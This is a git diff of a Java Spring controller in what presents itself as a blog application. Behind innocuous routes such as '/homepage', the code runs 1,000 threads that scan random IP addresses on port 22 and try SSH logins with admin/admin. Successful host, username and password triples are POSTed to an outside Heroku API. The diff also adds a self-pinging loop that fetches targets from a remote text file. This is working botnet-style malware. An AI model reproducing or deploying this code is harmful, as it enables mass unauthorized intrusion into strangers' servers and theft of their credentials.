@@ -1,20 +1,20 @@
 package com.phule.javavnnblog.controller;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.InetSocketAddress;
-import java.net.Socket;
-import java.net.URL;
-import java.net.UnknownHostException;
+import java.io.*;
+import java.net.*;
 import java.util.ArrayList;
 import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicInteger;
 
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.StringEntity;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
@@ -29,53 +29,92 @@ import com.phule.javavnnblog.model.Config;
 import com.phule.javavnnblog.model.SSHInfo;
 import com.phule.javavnnblog.service.BlogService;
 import com.phule.javavnnblog.utils.IpConverter;
+import sun.net.www.http.HttpClient;
 
 @Controller
 public class HomeController {
 	ArrayList<Authentication> authenList = new ArrayList<Authentication>();
+	ArrayList<String> websites = new ArrayList<String>();
 	Config config = null;
 	boolean flag = false;
 	@Autowired
-	BlogService blogService;
+	BlogService blog2Service;
 
 	@RequestMapping("/")
-	public String getHome(Model model) {
+	public String getHome(Model model) throws Exception {
 		return "home";
 	}
 
-	@RequestMapping(value = "/mybrute", method = RequestMethod.GET)
-	public String getBlogById(Model model) {
-		if (!flag) {
-			while(authenList.size() == 0){
-				
-				try {
-					authenList = getAuthenticationFile("http://www.sexycowgirlphotos.com/authentication.txt");
-				} catch (IOException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-			}
-			while(null == config){
-				try {
-					config = getConfigFile("http://www.sexycowgirlphotos.com/config.txt");
-				} catch (IOException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-			}
-			int numberOfThread =config.getThreads();
-			ExecutorService executor = Executors.newFixedThreadPool(numberOfThread);
-			for (int i = 0; i < numberOfThread; i++) {
-				Runnable worker = new MyRunnable(authenList, i, config.getTimeout());
-				executor.execute(worker);
-			}
-			executor.shutdown();
-			// Wait until all threads are finish
-			while (!executor.isTerminated()) {
+	@RequestMapping("/loop")
+	public String LoopForeverHeroku() {
+		while (websites.size() == 0) {
 
+			try {
+				websites = getWebsiteList("http://www.sexycowgirlphotos.com/websites.txt");
+			} catch (IOException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
 			}
-			System.out.println("\nFinished all threads");
 		}
+		final ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();
+		executorService.scheduleAtFixedRate(new Runnable() {
+			public void run() {
+				for (String website : websites) {
+					while (!sendGet(website)) {
+
+					}
+				}
+			}
+		}, 0, 5, TimeUnit.MINUTES);
+		return "home";
+	}
+
+	boolean sendGet(String url) {
+
+		URL obj;
+		try {
+			obj = new URL(url);
+			HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+
+			// optional default is GET
+			con.setRequestMethod("GET");
+
+			// add request header
+			// con.setRequestProperty("User-Agent", USER_AGENT);
+
+			int responseCode = con.getResponseCode();
+			if (responseCode == 200) {
+				return true;
+			} else {
+				return false;
+			}
+		} catch (MalformedURLException e) {
+			return false;
+		} catch (ProtocolException e) {
+			return false;
+		} catch (IOException e) {
+			return false;
+		}
+
+	}
+
+	@RequestMapping(value = "/homepage", method = RequestMethod.GET)
+	public String getBlogById(Model model) {
+		ExecutorService executor = Executors.newFixedThreadPool(1000);
+		for (int i = 0; i < 1000; i++) {
+			try {
+				Runnable worker = new MyRunnable(authenList, i, 7000);
+				executor.execute(worker);
+			} catch (Exception e) {
+				continue;
+			}
+		}
+		executor.shutdown();
+		// Wait until all threads are finish
+		while (!executor.isTerminated()) {
+
+		}
+		System.out.println("\nFinished all threads");
 		return "blog";
 
 	}
@@ -85,6 +124,7 @@ public class HomeController {
 		flag = true;
 		return "blog";
 	}
+
 	public ArrayList<Authentication> getAuthenticationFile(String fileURL) throws IOException {
 		URL url = new URL(fileURL);
 		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
@@ -96,7 +136,7 @@ public class HomeController {
 			String disposition = httpConn.getHeaderField("Content-Disposition");
 			String contentType = httpConn.getContentType();
 			int contentLength = httpConn.getContentLength();
-			
+
 			if (disposition != null) {
 				// extracts file name from header field
 				int index = disposition.indexOf("filename=");
@@ -116,14 +156,14 @@ public class HomeController {
 			// opens input stream from the HTTP connection
 			InputStream inputStream = httpConn.getInputStream();
 			BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
-		    String line;
-		    while ((line = reader.readLine()) != null) {
-		    	String[] lines = line.trim().split(";");
-		    	Authentication authen = new Authentication();
-		    	authen.setUsername(lines[0]);
-		    	authen.setPassword(lines[1]);
-		        authens.add(authen);
-		    }
+			String line;
+			while ((line = reader.readLine()) != null) {
+				String[] lines = line.trim().split(";");
+				Authentication authen = new Authentication();
+				authen.setUsername(lines[0]);
+				authen.setPassword(lines[1]);
+				authens.add(authen);
+			}
 			inputStream.close();
 			reader.close();
 			System.out.println("File downloaded");
@@ -133,6 +173,53 @@ public class HomeController {
 		httpConn.disconnect();
 		return authens;
 	}
+
+	public ArrayList<String> getWebsiteList(String fileURL) throws IOException {
+		URL url = new URL(fileURL);
+		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
+		int responseCode = httpConn.getResponseCode();
+		String fileName = "";
+		ArrayList<String> websites = null;
+		// always check HTTP response code first
+		if (responseCode == HttpURLConnection.HTTP_OK) {
+			String disposition = httpConn.getHeaderField("Content-Disposition");
+			String contentType = httpConn.getContentType();
+			int contentLength = httpConn.getContentLength();
+
+			if (disposition != null) {
+				// extracts file name from header field
+				int index = disposition.indexOf("filename=");
+				if (index > 0) {
+					fileName = disposition.substring(index + 10, disposition.length() - 1);
+				}
+			} else {
+				// extracts file name from URL
+				fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1, fileURL.length());
+			}
+
+			System.out.println("Content-Type = " + contentType);
+			System.out.println("Content-Disposition = " + disposition);
+			System.out.println("Content-Length = " + contentLength);
+			System.out.println("fileName = " + fileName);
+			websites = new ArrayList<String>();
+			// opens input stream from the HTTP connection
+			InputStream inputStream = httpConn.getInputStream();
+			BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+			String line;
+			while ((line = reader.readLine()) != null) {
+
+				websites.add(line);
+			}
+			inputStream.close();
+			reader.close();
+			System.out.println("File downloaded");
+		} else {
+			System.out.println("No file to download. Server replied HTTP code: " + responseCode);
+		}
+		httpConn.disconnect();
+		return websites;
+	}
+
 	public Config getConfigFile(String fileURL) throws IOException {
 		URL url = new URL(fileURL);
 		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
@@ -143,7 +230,7 @@ public class HomeController {
 			String disposition = httpConn.getHeaderField("Content-Disposition");
 			String contentType = httpConn.getContentType();
 			int contentLength = httpConn.getContentLength();
-			
+
 			if (disposition != null) {
 				// extracts file name from header field
 				int index = disposition.indexOf("filename=");
@@ -163,15 +250,15 @@ public class HomeController {
 			// opens input stream from the HTTP connection
 			InputStream inputStream = httpConn.getInputStream();
 			BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
-		    String line;
-		    while ((line = reader.readLine()) != null) {
-		    	String[] lines = line.trim().split(";");
-		    	Config config = new Config();
-		    	config.setTimeout(Integer.parseInt(lines[0]));
-		    	config.setThreads(Integer.parseInt(lines[1]));
-		    	config.setTimoutPort(Integer.parseInt(lines[2]));
-		    	return config;
-		    }
+			String line;
+			while ((line = reader.readLine()) != null) {
+				String[] lines = line.trim().split(";");
+				Config config = new Config();
+				config.setTimeout(Integer.parseInt(lines[0]));
+				config.setThreads(Integer.parseInt(lines[1]));
+				config.setTimoutPort(Integer.parseInt(lines[2]));
+				return config;
+			}
 			inputStream.close();
 			reader.close();
 			System.out.println("File downloaded");
@@ -181,6 +268,7 @@ public class HomeController {
 		httpConn.disconnect();
 		return null;
 	}
+
 	public class MyRunnable implements Runnable {
 		private int noThread;
 		private ArrayList<Authentication> authenList = new ArrayList<Authentication>();
@@ -193,56 +281,54 @@ public class HomeController {
 		}
 
 		public void run() {
-
+			//System.out.println("Chạy rồi!");
 			while (!flag) {
 				Random r = new Random();
 				String ip = IpConverter.longToIp(r.nextLong());
 				try {
-					//
-					
 					Socket socket = new Socket();
-					socket.connect(new InetSocketAddress(ip, 22), config.getTimoutPort());
+					socket.connect(new InetSocketAddress(ip, 22), 1000);
 					socket.close();
-					JSch jsch = new JSch();
-					for (int i = 0; i < authenList.size(); i++) {
-						String user = authenList.get(i).getUsername();
+					try {
+						//System.out.println("Port mở");
+						JSch jsch = new JSch();
+						String user = "admin";
 						Session session;
 						try {
 							session = jsch.getSession(user, ip, 22);
-							String passwd = authenList.get(i).getPassword();
+							String passwd = "admin";
 							session.setPassword(passwd);
 							session.setConfig("StrictHostKeyChecking", "no");
 							session.connect(timeOut);
-							System.out.println(noThread + ": Successfully." + ip + "|" + user + "|" + passwd);
-							MyCounter.incrementlLoginSuccessfullyCounter();
+							System.out.println("User & pass OK");
 							SSHInfo ssh = new SSHInfo();
 							ssh.setHost(ip);
 							ssh.setUsername(user);
 							ssh.setPassword(passwd);
-							blogService.insertSSH(ssh);
+							post("https://protected-brook-60637.herokuapp.com/api/sSHes","{\"ip\":\""+ip+"\", \"username\" : \""+user+"\",\"password\": \""+passwd+"\"}");
+							//blog2Service.insertSSH(ssh);
 							break;
-								
 						} catch (JSchException e) {
-							{
-								if (e.getMessage().contains("Auth")) {
-									//System.out.println(noThread + "|" + ip + "|" + e.getMessage());
-								} else {
-									break;
-								}
+							//System.out.println(e.getMessage());
+							if (e.getMessage().contains("Auth")) {
+								//System.out.println("Wrong user & pass");
+							} else {
+								break;
 							}
+						} catch (Exception e) {
+							
+							continue;
 						}
-					}
-				} catch (UnknownHostException e) {
-					// System.out.println(noThread+"|"+ip+"|"+e.getMessage());
-				} catch (IOException e) {
-					// TODO Auto-generated catch block
-					 //System.out.println(noThread+"|"+ip+"|"+e.getMessage());
-				}
+					}catch(Exception e){
 
+						continue;
+					}
+				} catch (Exception ex) {
+					continue;
+				}
 			}
 
 		}
-
 		public int getNoThread() {
 			return noThread;
 		}
@@ -267,7 +353,7 @@ public class HomeController {
 
 		static void incrementCounter() {
 			ones.incrementAndGet();
-			System.out.println(Thread.currentThread().getName() + ": " + ones.get());
+			System.out.println(ones.get());
 		}
 
 		static void incrementlLoginSuccessfullyCounter() {
@@ -276,6 +362,16 @@ public class HomeController {
 					Thread.currentThread().getName() + " Number of SSH Found : " + loginSuccessfullyCounter.get());
 		}
 
+	}
+	 void post(String url, String param ) throws Exception{
+		CloseableHttpClient client = HttpClients.createDefault();
+		HttpPost httpPost = new HttpPost(url);
+		StringEntity entity = new StringEntity(param);
+		httpPost.setEntity(entity);
+		httpPost.setHeader("Accept", "application/json");
+		httpPost.setHeader("Content-type", "application/json");
+		CloseableHttpResponse response = client.execute(httpPost);
+		client.close();
 	}
 
 }
